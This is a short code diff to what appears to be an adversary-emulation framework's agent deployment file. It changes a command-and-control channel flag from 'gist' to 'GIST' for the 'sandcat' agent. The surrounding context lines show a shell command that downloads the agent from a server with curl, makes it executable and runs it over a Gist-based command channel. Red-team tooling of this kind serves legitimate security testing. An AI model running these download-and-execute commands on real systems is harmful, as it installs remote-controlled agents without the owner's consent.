@@ -31,7 +31,7 @@
               server="#{app.contact.http}";
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
               chmod +x sandcat.go;
-              ./sandcat.go -c2 gist -v
+              ./sandcat.go -c2 GIST -v
     linux:
       sh:
         command: |
@@ -55,7 +55,7 @@
               server="#{app.contact.http}";
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
               chmod +x sandcat.go;
-              ./sandcat.go -c2 gist -v
+              ./sandcat.go -c2 GIST -v
     windows:
       psh:
         command: |
